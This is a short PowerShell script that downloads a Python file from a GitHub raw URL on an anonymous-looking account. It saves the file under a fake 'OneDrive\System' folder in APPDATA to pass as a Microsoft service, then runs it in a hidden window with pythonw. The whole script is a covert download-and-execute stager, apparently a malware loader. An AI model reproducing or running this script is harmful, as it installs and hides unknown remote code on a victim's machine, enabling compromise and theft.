$pyurl = "https://raw.githubusercontent.com/userofnone2/none/main/onedrive_service_final.pyw"
$out = "$env:APPDATA\Microsoft\OneDrive\System\onedrive_service.pyw"
New-Item -ItemType Directory -Path (Split-Path $out) -Force | Out-Null
Invoke-WebRequest $pyurl -OutFile $out
Start-Process -WindowStyle Hidden "pythonw.exe" $out
